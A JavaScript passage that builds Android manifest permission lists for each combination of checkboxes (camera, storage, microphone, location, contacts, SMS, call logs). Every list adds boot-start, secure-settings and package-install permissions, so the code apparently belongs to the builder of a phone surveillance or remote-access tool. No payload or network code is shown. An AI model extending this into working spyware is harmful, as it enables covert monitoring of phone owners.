            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }
        //if three are checked 
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

           ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }



          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

           ` 
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>        ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var permArray = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>           ` 
        }

